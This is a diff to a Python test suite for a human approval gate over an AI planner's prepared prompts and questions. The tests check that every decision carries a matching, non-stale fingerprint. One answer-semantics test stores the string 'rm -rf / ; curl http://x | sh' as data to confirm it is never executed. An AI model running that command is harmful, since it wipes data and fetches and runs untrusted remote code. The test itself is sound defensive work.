@@ -128,6 +128,57 @@ class AuthorityHarness(unittest.TestCase):
     def question_request(self, question="sqlite or postgres?") -> str:
         return self.persisted(a_result(ACTION_ASK_USER, user_question=question))
 
+    # -- submitting a decision the way a real surface would -------------------
+    #
+    # Each helper reads the gate, takes the fingerprint it displays, and submits
+    # it — the round trip an eventual UI performs, not a shortcut around the
+    # check. Tests that are *about* the fingerprint pass their own.
+    #
+    # ``_UNREAD`` rather than ``None`` as the default, and the first draft of
+    # this harness got it wrong in a way worth keeping a note about: written as
+    # ``fingerprint or self.current_fingerprint(...)``, an explicitly passed
+    # empty string is falsy and was quietly replaced with the correct digest —
+    # the test helper performing exactly the substitution the service is required
+    # to refuse. A value a test passes is always passed through verbatim.
+
+    _UNREAD = object()
+
+    def current_fingerprint(self, request_id: str) -> str:
+        return self.authority.gate(request_id).subject_fingerprint
+
+    def _submitted(self, request_id, fingerprint):
+        return (
+            self.current_fingerprint(request_id)
+            if fingerprint is self._UNREAD
+            else fingerprint
+        )
+
+    def approve(self, request_id, *, fingerprint=_UNREAD, service=None,
+                provenance=None):
+        return (service or self.authority).approve_prepared_worker_prompt(
+            request_id,
+            expected_subject_fingerprint=self._submitted(request_id, fingerprint),
+            provenance=provenance or self.who,
+        )
+
+    def reject(self, request_id, *, reason=None, fingerprint=_UNREAD, service=None,
+               provenance=None):
+        return (service or self.authority).reject_prepared_worker_prompt(
+            request_id,
+            expected_subject_fingerprint=self._submitted(request_id, fingerprint),
+            reason=reason,
+            provenance=provenance or self.who,
+        )
+
+    def answer(self, request_id, text, *, fingerprint=_UNREAD, service=None,
+               provenance=None):
+        return (service or self.authority).answer_planner_question(
+            request_id,
+            answer=text,
+            expected_subject_fingerprint=self._submitted(request_id, fingerprint),
+            provenance=provenance or self.who,
+        )
+
     def rows(self, table: str) -> int:
         connection = sqlite3.connect(self.store.path)
         try:
@@ -167,7 +218,7 @@ class GateDerivation(AuthorityHarness):
         stopped = self.authority.gate(self.persisted(a_result(ACTION_STOP)))
         failed = self.authority.gate(self.persisted(status=STATUS_FAILED))
         rejected_id = self.prompt_request()
-        self.authority.reject_prepared_worker_prompt(rejected_id, provenance=self.who)
+        self.reject(rejected_id)
         rejected = self.authority.gate(rejected_id)
 
         self.assertEqual(stopped.no_gate_reason, NO_GATE_PLANNER_STOPPED)
@@ -250,10 +301,7 @@ class GateDerivation(AuthorityHarness):
 class DecisionsPersist(AuthorityHarness):
     def test_an_answer_persists(self):
         request_id = self.question_request()
-        gate = self.authority.answer_planner_question(
-            request_id, answer="postgres, çünkü ilişkisel sorgular lazım",
-            provenance=self.who,
-        )
+        gate = self.answer(request_id, "postgres, çünkü ilişkisel sorgular lazım")
         self.assertEqual(gate.state, GATE_STATE_ANSWERED)
         reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
         self.assertEqual(reloaded.state, GATE_STATE_ANSWERED)
@@ -263,31 +311,27 @@ class DecisionsPersist(AuthorityHarness):
 
     def test_an_approval_persists(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
         self.assertEqual(reloaded.state, GATE_STATE_APPROVED)
         self.assertEqual(reloaded.event.authority_action, "approve")
 
     def test_a_rejection_persists_with_its_reason(self):
         request_id = self.prompt_request()
-        gate = self.authority.reject_prepared_worker_prompt(
-            request_id, reason="scope is wider than I asked for", provenance=self.who
-        )
+        gate = self.reject(request_id, reason="scope is wider than I asked for")
         self.assertEqual(gate.state, GATE_STATE_REJECTED)
         reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
         self.assertEqual(reloaded.event.rejection_reason,
                          "scope is wider than I asked for")
 
     def test_a_rejection_needs_no_reason(self):
-        gate = self.authority.reject_prepared_worker_prompt(
-            self.prompt_request(), provenance=self.who
-        )
+        gate = self.reject(self.prompt_request())
         self.assertEqual(gate.state, GATE_STATE_REJECTED)
         self.assertIsNone(gate.event.rejection_reason)
 
     def test_provenance_persists(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         event = self.store.authority_event(request_id)
         self.assertEqual(event.actor, "user")
         self.assertEqual(event.source, "internal_test")
@@ -295,9 +339,7 @@ class DecisionsPersist(AuthorityHarness):
 
     def test_the_decision_carries_its_own_identity(self):
         request_id = self.prompt_request()
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who
-        )
+        gate = self.approve(request_id)
         self.assertTrue(gate.event.authority_event_id.startswith("auth_"))
         self.assertNotEqual(gate.event.authority_event_id, request_id)
 
@@ -316,28 +358,24 @@ class ModelOutputIsNotRewritten(AuthorityHarness):
     def test_approval_does_not_touch_the_planner_row(self):
         request_id = self.prompt_request()
         before = self.store.get(request_id).to_dict()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         self.assertEqual(self.store.get(request_id).to_dict(), before)
 
     def test_rejection_does_not_blank_the_prepared_prompt(self):
         request_id = self.prompt_request()
-        self.authority.reject_prepared_worker_prompt(
-            request_id, reason="no", provenance=self.who
-        )
+        self.reject(request_id, reason="no")
         record = self.store.get(request_id)
         self.assertEqual(record.worker_prompt, "implement the thing")
         self.assertEqual(record.action, ACTION_PREPARE_WORKER_PROMPT)
 
     def test_an_answer_does_not_overwrite_the_question(self):
         request_id = self.question_request()
-        self.authority.answer_planner_question(
-            request_id, answer="postgres", provenance=self.who
-        )
+        self.answer(request_id, "postgres")
         self.assertEqual(self.store.get(request_id).user_question, "sqlite or postgres?")
 
     def test_the_planner_action_never_becomes_a_human_word(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         self.assertNotIn(
             self.store.get(request_id).action,
             ("approved", "rejected", "answered", "APPROVED", "REJECTED"),
@@ -345,13 +383,13 @@ class ModelOutputIsNotRewritten(AuthorityHarness):
 
     def test_the_two_facts_stay_in_separate_tables(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         self.assertEqual(self.rows("planner_requests"), 1)
         self.assertEqual(self.rows("planner_authority_events"), 1)
 
     def test_the_read_model_keeps_them_apart(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         payload = self.authority.view(request_id).to_dict()
         self.assertEqual(set(payload), {"planner_request", "human_gate"})
         self.assertEqual(payload["planner_request"]["action"],
@@ -365,9 +403,7 @@ class ModelOutputIsNotRewritten(AuthorityHarness):
 class HashBinding(AuthorityHarness):
     def test_an_approval_binds_the_exact_prompt(self):
         request_id = self.prompt_request("do exactly this")
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who
-        )
+        gate = self.approve(request_id)
         expected = authority_subject_fingerprint(
             planner_request_id=request_id,
             result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
@@ -379,9 +415,7 @@ class HashBinding(AuthorityHarness):
 
     def test_an_answer_binds_the_exact_question(self):
         request_id = self.question_request("which database?")
-        gate = self.authority.answer_planner_question(
-            request_id, answer="postgres", provenance=self.who
-        )
+        gate = self.answer(request_id, "postgres")
         expected = authority_subject_fingerprint(
             planner_request_id=request_id,
             result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
@@ -394,7 +428,7 @@ class HashBinding(AuthorityHarness):
     def test_a_changed_prompt_cannot_reuse_an_approval(self):
         """The property a future dispatcher must be able to prove."""
         request_id = self.prompt_request("do exactly this")
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
 
         connection = sqlite3.connect(self.store.path)
         connection.execute(
@@ -485,6 +519,315 @@ class HashBinding(AuthorityHarness):
         )
 
 
+# -- the required stale-view check -------------------------------------------
+
+
+class TheFingerprintIsRequired(AuthorityHarness):
+    """Two properties that are easy to confuse, and only one is free.
+
+    *The stored event binds the subject that existed when the write happened* is
+    true from the fingerprint column alone. *The person intended to authorize the
+    subject they were shown* can only be asserted by the caller, by naming the
+    digest it displayed — and it is the one that matters, because a caller that
+    names nothing is not saying "I approve this text", it is saying "I approve
+    whatever is there".
+
+    So the argument is mandatory on every operation, with no default and no
+    substitute-the-current-value fallback. This class is the enforcement.
+    """
+
+    def assert_untouched(self, request_id):
+        self.assertIsNone(self.store.authority_event(request_id))
+        self.assertEqual(self.rows("planner_authority_events"), 0)
+        self.assertTrue(self.authority.gate(request_id).awaiting_human)
+
+    # -- 1-4. it cannot be omitted -------------------------------------------
+
+    def test_approve_requires_the_expected_fingerprint(self):
+        request_id = self.prompt_request()
+        with self.assertRaises(TypeError):
+            self.authority.approve_prepared_worker_prompt(
+                request_id, provenance=self.who)
+        self.assert_untouched(request_id)
+
+    def test_reject_requires_the_expected_fingerprint(self):
+        request_id = self.prompt_request()
+        with self.assertRaises(TypeError):
+            self.authority.reject_prepared_worker_prompt(
+                request_id, reason="no", provenance=self.who)
+        self.assert_untouched(request_id)
+
+    def test_answer_requires_the_expected_fingerprint(self):
+        request_id = self.question_request()
+        with self.assertRaises(TypeError):
+            self.authority.answer_planner_question(
+                request_id, answer="postgres", provenance=self.who)
+        self.assert_untouched(request_id)
+
+    def test_no_operation_carries_a_default(self):
+        """A default is how "required" quietly becomes "optional" again."""
+        for method in (
+            PlannerAuthorityService.answer_planner_question,
+            PlannerAuthorityService.approve_prepared_worker_prompt,
+            PlannerAuthorityService.reject_prepared_worker_prompt,
+        ):
+            parameter = inspect.signature(method).parameters[
+                "expected_subject_fingerprint"
+            ]
+            self.assertIs(parameter.default, inspect.Parameter.empty,
+                          f"{method.__name__} defaults the fingerprint")
+            self.assertEqual(parameter.kind, inspect.Parameter.KEYWORD_ONLY)
+
+    # -- 5-6. an unusable value is not "unspecified" -------------------------
+
+    def test_none_is_refused_rather_than_treated_as_unspecified(self):
+        request_id = self.prompt_request()
+        with self.assertRaises(PlannerAuthorityInvalid):
+            self.authority.approve_prepared_worker_prompt(
+                request_id, expected_subject_fingerprint=None,
+                provenance=self.who)
+        self.assert_untouched(request_id)
+
+    def test_an_empty_fingerprint_is_refused(self):
+        request_id = self.prompt_request()
+        with self.assertRaises(PlannerAuthorityInvalid):
+            self.approve(request_id, fingerprint="")
+        self.assert_untouched(request_id)
+
+    def test_a_malformed_fingerprint_is_refused(self):
+        request_id = self.question_request()
+        for bad in ("nope", "0" * 63, "0" * 65, "Z" * 64, "0" * 64 + " ", 7, object()):
+            with self.assertRaises(PlannerAuthorityInvalid):
+                self.answer(request_id, "postgres", fingerprint=bad)
+        self.assert_untouched(request_id)
+
+    def test_an_uppercase_digest_is_refused_rather_than_folded(self):
+        """The stored form is lowercase hex. Accepting another spelling would
+        make two different strings mean the same authority."""
+        request_id = self.prompt_request()
+        with self.assertRaises(PlannerAuthorityInvalid):
+            self.approve(request_id,
+                         fingerprint=self.current_fingerprint(request_id).upper())
+        self.assert_untouched(request_id)
+
+    # -- 7-11. a wrong or stale digest ---------------------------------------
+
+    def test_a_wrong_prompt_fingerprint_is_refused_without_mutation(self):
+        request_id = self.prompt_request()
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(request_id, fingerprint="0" * 64)
+        self.assert_untouched(request_id)
+
+    def test_a_wrong_question_fingerprint_is_refused_without_mutation(self):
+        request_id = self.question_request()
+        with self.assertRaises(PlannerAuthorityStale):
+            self.answer(request_id, "postgres", fingerprint="a" * 64)
+        self.assert_untouched(request_id)
+
+    def test_a_fingerprint_from_another_request_is_refused(self):
+        """Identical text in another turn is still another turn's authority."""
+        mine = self.prompt_request("do exactly this")
+        theirs = self.prompt_request("do exactly this")
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(mine, fingerprint=self.current_fingerprint(theirs))
+        self.assert_untouched(mine)
+        self.assertIsNone(self.store.authority_event(theirs))
+
+    def test_a_fingerprint_for_the_other_action_is_refused(self):
+        """The action is bound in, so a question's digest cannot approve a prompt."""
+        request_id = self.prompt_request("identical")
+        as_question = authority_subject_fingerprint(
+            planner_request_id=request_id,
+            result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
+            action=ACTION_ASK_USER, subject="identical",
+        )
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(request_id, fingerprint=as_question)
+        self.assert_untouched(request_id)
+
+    def test_a_changed_prompt_refuses_the_digest_the_person_saw(self):
+        """Read A, prompt becomes B, submit A — the refusal this argument is for."""
+        request_id = self.prompt_request("do exactly this")
+        displayed = self.current_fingerprint(request_id)
+        self._set(request_id, "worker_prompt", "do something else entirely")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(request_id, fingerprint=displayed)
+        self.assert_untouched(request_id)
+
+    def test_a_changed_prompt_refuses_a_rejection_too(self):
+        request_id = self.prompt_request("do exactly this")
+        displayed = self.current_fingerprint(request_id)
+        self._set(request_id, "worker_prompt", "something quite different")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.reject(request_id, reason="no", fingerprint=displayed)
+        self.assert_untouched(request_id)
+
+    def test_a_changed_question_refuses_the_digest_the_person_saw(self):
+        """An answer is authority for *this* question, not for this request id."""
+        request_id = self.question_request("which database?")
+        displayed = self.current_fingerprint(request_id)
+        self._set(request_id, "user_question", "which deployment target?")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.answer(request_id, "postgres", fingerprint=displayed)
+        self.assert_untouched(request_id)
+
+    # -- 12-14. the correct digest works -------------------------------------
+
+    def test_the_correct_fingerprint_approves(self):
+        request_id = self.prompt_request()
+        gate = self.approve(request_id,
+                            fingerprint=self.current_fingerprint(request_id))
+        self.assertEqual(gate.state, GATE_STATE_APPROVED)
+        self.assertTrue(gate.binds_current_subject)
+
+    def test_the_correct_fingerprint_rejects(self):
+        request_id = self.prompt_request()
+        gate = self.reject(request_id, reason="wrong scope",
+                           fingerprint=self.current_fingerprint(request_id))
+        self.assertEqual(gate.state, GATE_STATE_REJECTED)
+        self.assertEqual(gate.event.rejection_reason, "wrong scope")
+
+    def test_the_correct_fingerprint_answers(self):
+        request_id = self.question_request()
+        gate = self.answer(request_id, "postgres",
+                           fingerprint=self.current_fingerprint(request_id))
+        self.assertEqual(gate.state, GATE_STATE_ANSWERED)
+        self.assertEqual(gate.event.answer_text, "postgres")
+
+    def test_the_recorded_digest_is_the_one_that_was_verified(self):
+        request_id = self.prompt_request("bind exactly this")
+        displayed = self.current_fingerprint(request_id)
+        gate = self.approve(request_id, fingerprint=displayed)
+        self.assertEqual(gate.event.subject_fingerprint, displayed)
+
+    # -- 15-16. a retry does not get a free pass -----------------------------
+
+    def test_an_identical_retry_with_the_same_digest_is_idempotent(self):
+        request_id = self.prompt_request()
+        displayed = self.current_fingerprint(request_id)
+        first = self.approve(request_id, fingerprint=displayed)
+        second = self.approve(request_id, fingerprint=displayed)
+        self.assertEqual(second.state, GATE_STATE_APPROVED)
+        self.assertEqual(first.event.authority_event_id,
+                         second.event.authority_event_id)
+        self.assertEqual(self.rows("planner_authority_events"), 1)
+
+    def test_a_retry_does_not_bypass_the_check(self):
+        """The check runs before the terminal-decision short-circuit.
+
+        Otherwise a caller looking at text that has since changed would be told
+        "already approved" — an answer about a subject it is not holding.
+        """
+        request_id = self.prompt_request("the original prompt")
+        self.approve(request_id)
+        self._set(request_id, "worker_prompt", "a replaced prompt")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(request_id, fingerprint="b" * 64)
+        # And the decision that does exist is untouched.
+        self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
+        self.assertEqual(self.rows("planner_authority_events"), 1)
+
+    def test_a_stale_retry_is_refused_rather_than_reported_as_decided(self):
+        request_id = self.prompt_request("the original prompt")
+        displayed = self.current_fingerprint(request_id)
+        self.approve(request_id, fingerprint=displayed)
+        self._set(request_id, "worker_prompt", "a replaced prompt")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.approve(request_id, fingerprint=displayed)
+        self.assertEqual(self.rows("planner_authority_events"), 1)
+
+    def test_a_contradicting_action_with_a_good_digest_still_conflicts(self):
+        request_id = self.prompt_request()
+        self.approve(request_id)
+        with self.assertRaises(PlannerAuthorityConflict):
+            self.reject(request_id, reason="changed my mind")
+        self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
+        self.assertEqual(self.rows("planner_authority_events"), 1)
+
+    def test_a_contradicting_action_with_a_stale_digest_is_refused_as_stale(self):
+        """Staleness is checked first: the caller is not even looking at this."""
+        request_id = self.prompt_request("the original prompt")
+        self.approve(request_id)
+        self._set(request_id, "worker_prompt", "a replaced prompt")
+
+        with self.assertRaises(PlannerAuthorityStale):
+            self.reject(request_id, reason="no", fingerprint="c" * 64)
+        self.assertEqual(self.rows("planner_authority_events"), 1)
+
+    # -- 17. the read model closes the loop ----------------------------------
+
+    def test_the_read_model_exposes_what_a_submission_needs(self):
+        """read → display → submit, with no second scheme and no guessing."""
+        request_id = self.prompt_request("the prompt a person reads")
+        payload = self.authority.view(request_id).to_dict()
+
+        subject = payload["planner_request"]["worker_prompt"]
+        digest = payload["human_gate"]["subject_fingerprint"]
+        self.assertEqual(subject, "the prompt a person reads")
+        self.assertEqual(len(digest), 64)
+        self.assertEqual(payload["human_gate"]["permitted_actions"],
+                         ["approve", "reject"])
+
+        # Everything the submission needs came out of that one read.
+        gate = self.approve(request_id, fingerprint=digest)
+        self.assertEqual(gate.state, GATE_STATE_APPROVED)
+        self.assertTrue(gate.binds_current_subject)
+
+    def test_the_answer_gate_round_trips_the_same_way(self):
+        request_id = self.question_request("hangi veritabanı?")
+        payload = self.authority.view(request_id).to_dict()
+        self.assertEqual(payload["planner_request"]["user_question"],
+                         "hangi veritabanı?")
+        gate = self.answer(request_id, "postgres",
+                           fingerprint=payload["human_gate"]["subject_fingerprint"])
+        self.assertEqual(gate.state, GATE_STATE_ANSWERED)
+
+    def test_the_displayed_digest_is_the_one_hash_scheme(self):
+        """No second scheme was introduced for the round trip."""
+        request_id = self.prompt_request("some prompt")
+        displayed = self.authority.view(request_id).to_dict()["human_gate"][
+            "subject_fingerprint"
+        ]
+        self.assertEqual(
+            displayed,
+            authority_subject_fingerprint(
+                planner_request_id=request_id,
+                result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
+                action=ACTION_PREPARE_WORKER_PROMPT, subject="some prompt",
+            ),
+        )
+
+    # -- 18. nothing about dispatch changed ----------------------------------
+
+    def test_requiring_the_digest_did_not_add_a_dispatch_path(self):
+        from cofferdam.workstation.tasks.adapters import build_registry
+
+        request_id = self.prompt_request()
+        self.approve(request_id)
+        self.assertEqual(build_registry().ids(), ())
+        self.assertFalse((self.dir / "tasks.sqlite3").exists())
+        for forbidden in ("dispatch", "run_worker", "execute", "create_task",
+                          "submit", "replan"):
+            self.assertFalse(hasattr(PlannerAuthorityService, forbidden))
+
+    def _set(self, request_id, column, value):
+        """Move the subject underneath a caller, as only direct SQL could."""
+        connection = sqlite3.connect(self.store.path)
+        try:
+            connection.execute(
+                f"UPDATE planner_requests SET {column} = ? WHERE planner_request_id = ?",
+                (value, request_id),
+            )
+            connection.commit()
+        finally:
+            connection.close()
+
+
 # -- 14-17. invalid actions refused without mutation -------------------------
 
 
@@ -496,36 +839,27 @@ class InvalidActionsRefused(AuthorityHarness):
     def test_answer_against_a_prepared_prompt_is_refused(self):
         request_id = self.prompt_request()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.answer_planner_question(
-                request_id, answer="sure", provenance=self.who
-            )
+            self.answer(request_id, "sure")
         self.assert_untouched(request_id)
 
     def test_approve_against_a_question_is_refused(self):
         request_id = self.question_request()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who
-            )
+            self.approve(request_id)
         self.assert_untouched(request_id)
 
     def test_reject_against_a_question_is_refused(self):
         request_id = self.question_request()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.reject_prepared_worker_prompt(
-                request_id, provenance=self.who
-            )
+            self.reject(request_id)
         self.assert_untouched(request_id)
 
     def test_every_action_against_stop_is_refused(self):
         request_id = self.persisted(a_result(ACTION_STOP))
         for call in (
-            lambda: self.authority.answer_planner_question(
-                request_id, answer="x", provenance=self.who),
-            lambda: self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who),
-            lambda: self.authority.reject_prepared_worker_prompt(
-                request_id, provenance=self.who),
+            lambda: self.answer(request_id, "x"),
+            lambda: self.approve(request_id),
+            lambda: self.reject(request_id),
         ):
             with self.assertRaises(PlannerAuthorityRefused):
                 call()
@@ -534,24 +868,21 @@ class InvalidActionsRefused(AuthorityHarness):
     def test_every_action_against_a_failed_invocation_is_refused(self):
         request_id = self.persisted(status=STATUS_FAILED)
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.approve(request_id)
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.answer_planner_question(
-                request_id, answer="x", provenance=self.who)
+            self.answer(request_id, "x")
         self.assert_untouched(request_id)
 
     def test_every_action_against_an_interrupted_invocation_is_refused(self):
         request_id = self.persisted(status=STATUS_INTERRUPTED)
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.reject_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.reject(request_id)
         self.assert_untouched(request_id)
 
     def test_a_nonexistent_request_is_refused(self):
+        """Refused as a missing request, before the fingerprint is even looked at."""
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.approve_prepared_worker_prompt(
-                "plan_nope", provenance=self.who)
+            self.approve("plan_nope", fingerprint="0" * 64)
         self.assertEqual(self.rows("planner_authority_events"), 0)
 
     def test_approval_with_no_prompt_is_refused(self):
@@ -563,8 +894,7 @@ class InvalidActionsRefused(AuthorityHarness):
         connection.commit()
         connection.close()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.approve(request_id)
         self.assert_untouched(request_id)
 
     def test_answer_with_no_question_is_refused(self):
@@ -576,8 +906,7 @@ class InvalidActionsRefused(AuthorityHarness):
         connection.commit()
         connection.close()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.answer_planner_question(
-                request_id, answer="x", provenance=self.who)
+            self.answer(request_id, "x")
         self.assert_untouched(request_id)
 
     def test_a_result_this_build_cannot_read_is_refused(self):
@@ -590,8 +919,7 @@ class InvalidActionsRefused(AuthorityHarness):
         connection.commit()
         connection.close()
         with self.assertRaises(PlannerAuthorityRefused):
-            self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.approve(request_id)
         self.assert_untouched(request_id)
 
 
@@ -603,36 +931,31 @@ class AnswerSemantics(AuthorityHarness):
         request_id = self.question_request()
         for empty in ("", "   ", "\n\t "):
             with self.assertRaises(PlannerAuthorityInvalid):
-                self.authority.answer_planner_question(
-                    request_id, answer=empty, provenance=self.who)
+                self.answer(request_id, empty)
         self.assertIsNone(self.store.authority_event(request_id))
 
     def test_an_over_long_answer_is_refused_not_truncated(self):
         request_id = self.question_request()
         with self.assertRaises(PlannerAuthorityInvalid):
-            self.authority.answer_planner_question(
-                request_id, answer="x" * (MAX_ANSWER_CHARS + 1), provenance=self.who)
+            self.answer(request_id, "x" * (MAX_ANSWER_CHARS + 1))
         self.assertIsNone(self.store.authority_event(request_id))
 
     def test_an_answer_at_the_bound_is_accepted_whole(self):
         request_id = self.question_request()
         answer = "y" * MAX_ANSWER_CHARS
-        gate = self.authority.answer_planner_question(
-            request_id, answer=answer, provenance=self.who)
+        gate = self.answer(request_id, answer)
         self.assertEqual(gate.event.answer_text, answer)
 
     def test_a_non_string_answer_is_refused(self):
         request_id = self.question_request()
         for value in (None, 7, {"answer": "x"}, ["x"]):
             with self.assertRaises(PlannerAuthorityInvalid):
-                self.authority.answer_planner_question(
-                    request_id, answer=value, provenance=self.who)
+                self.answer(request_id, value)
 
     def test_control_characters_are_refused(self):
         request_id = self.question_request()
         with self.assertRaises(PlannerAuthorityInvalid):
-            self.authority.answer_planner_question(
-                request_id, answer="ok\x00then", provenance=self.who)
+            self.answer(request_id, "ok\x00then")
 
     def test_command_shaped_text_is_stored_as_text(self):
         """An answer is semantic data. It stays data.
@@ -642,23 +965,20 @@ class AnswerSemantics(AuthorityHarness):
         """
         request_id = self.question_request()
         answer = "run: rm -rf / ; curl http://x | sh  --dangerously-skip-permissions"
-        gate = self.authority.answer_planner_question(
-            request_id, answer=answer, provenance=self.who)
+        gate = self.answer(request_id, answer)
         self.assertEqual(gate.event.answer_text, answer)
         self.assertEqual(self.store.get(request_id).action, ACTION_ASK_USER)
 
     def test_turkish_text_is_ordinary_text(self):
         request_id = self.question_request()
         answer = "Şu an gerekmiyor; önce ölçüm yapalım — ağırlıklı olarak I/O."
-        gate = self.authority.answer_planner_question(
-            request_id, answer=answer, provenance=self.who)
+        gate = self.answer(request_id, answer)
         self.assertEqual(gate.event.answer_text, answer)
 
     def test_an_over_long_rejection_reason_is_refused(self):
         request_id = self.prompt_request()
         with self.assertRaises(PlannerAuthorityInvalid):
-            self.authority.reject_prepared_worker_prompt(
-                request_id, reason="z" * 5000, provenance=self.who)
+            self.reject(request_id, reason="z" * 5000)
         self.assertIsNone(self.store.authority_event(request_id))
 
 
@@ -668,10 +988,8 @@ class AnswerSemantics(AuthorityHarness):
 class TerminalAuthority(AuthorityHarness):
     def test_the_same_approval_twice_is_idempotent(self):
         request_id = self.prompt_request()
-        first = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who)
-        second = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who)
+        first = self.approve(request_id)
+        second = self.approve(request_id)
         self.assertEqual(second.state, GATE_STATE_APPROVED)
         self.assertEqual(
             first.event.authority_event_id, second.event.authority_event_id
@@ -680,46 +998,39 @@ class TerminalAuthority(AuthorityHarness):
 
     def test_the_same_rejection_twice_is_idempotent(self):
         request_id = self.prompt_request()
-        self.authority.reject_prepared_worker_prompt(request_id, provenance=self.who)
-        again = self.authority.reject_prepared_worker_prompt(
-            request_id, provenance=self.who)
+        self.reject(request_id)
+        again = self.reject(request_id)
         self.assertEqual(again.state, GATE_STATE_REJECTED)
         self.assertEqual(self.rows("planner_authority_events"), 1)
 
     def test_a_second_answer_does_not_replace_the_first(self):
         request_id = self.question_request()
-        self.authority.answer_planner_question(
-            request_id, answer="the first answer", provenance=self.who)
-        again = self.authority.answer_planner_question(
-            request_id, answer="a completely different answer", provenance=self.who)
+        self.answer(request_id, "the first answer")
+        again = self.answer(request_id, "a completely different answer")
         # Idempotent by action, and the stored text is still the original.
         self.assertEqual(again.event.answer_text, "the first answer")
         self.assertEqual(self.rows("planner_authority_events"), 1)
 
     def test_approve_then_reject_is_refused(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         with self.assertRaises(PlannerAuthorityConflict):
-            self.authority.reject_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.reject(request_id)
         self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
         self.assertEqual(self.rows("planner_authority_events"), 1)
 
     def test_reject_then_approve_is_refused(self):
         request_id = self.prompt_request()
-        self.authority.reject_prepared_worker_prompt(
-            request_id, reason="no", provenance=self.who)
+        self.reject(request_id, reason="no")
         with self.assertRaises(PlannerAuthorityConflict):
-            self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who)
+            self.approve(request_id)
         gate = self.authority.gate(request_id)
         self.assertEqual(gate.state, GATE_STATE_REJECTED)
         self.assertEqual(gate.event.rejection_reason, "no")
 
     def test_a_decided_gate_permits_nothing_further(self):
         request_id = self.prompt_request()
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who)
+        gate = self.approve(request_id)
         self.assertEqual(gate.permitted_actions, ())
         self.assertFalse(gate.awaiting_human)
         self.assertTrue(gate.decided)
@@ -759,8 +1070,8 @@ class Concurrency(AuthorityHarness):
 
     def test_two_simultaneous_approvals_produce_one_authority(self):
         request_id = self.prompt_request()
-        approve = lambda: self.authority.approve_prepared_worker_prompt(  # noqa: E731
-            request_id, provenance=self.who)
+        approve = lambda: self.approve(# noqa: E731
+            request_id)
         outcomes = self.race([approve] * 6)
 
         self.assertEqual([error for _, error in outcomes], [None] * 6)
@@ -773,10 +1084,8 @@ class Concurrency(AuthorityHarness):
     def test_approve_and_reject_racing_leaves_exactly_one_winner(self):
         request_id = self.prompt_request()
         outcomes = self.race(
-            [lambda: self.authority.approve_prepared_worker_prompt(
-                request_id, provenance=self.who)] * 4
-            + [lambda: self.authority.reject_prepared_worker_prompt(
-                request_id, provenance=self.who)] * 4
+            [lambda: self.approve(request_id)] * 4
+            + [lambda: self.reject(request_id)] * 4
         )
         self.assertEqual(self.rows("planner_authority_events"), 1)
 
@@ -807,8 +1116,7 @@ class Concurrency(AuthorityHarness):
             PlannerAuthorityService(store=PlannerStore(self.dir)) for _ in range(4)
         ]
         outcomes = self.race([
-            (lambda service=service: service.approve_prepared_worker_prompt(
-                request_id, provenance=self.who))
+            (lambda service=service: self.approve(request_id, service=service))
             for service in services
         ])
 
@@ -820,10 +1128,8 @@ class Concurrency(AuthorityHarness):
     def test_concurrent_answers_record_one(self):
         request_id = self.question_request()
         outcomes = self.race(
-            [lambda: self.authority.answer_planner_question(
-                request_id, answer="first", provenance=self.who),
-             lambda: self.authority.answer_planner_question(
-                request_id, answer="second", provenance=self.who)]
+            [lambda: self.answer(request_id, "first"),
+             lambda: self.answer(request_id, "second")]
         )
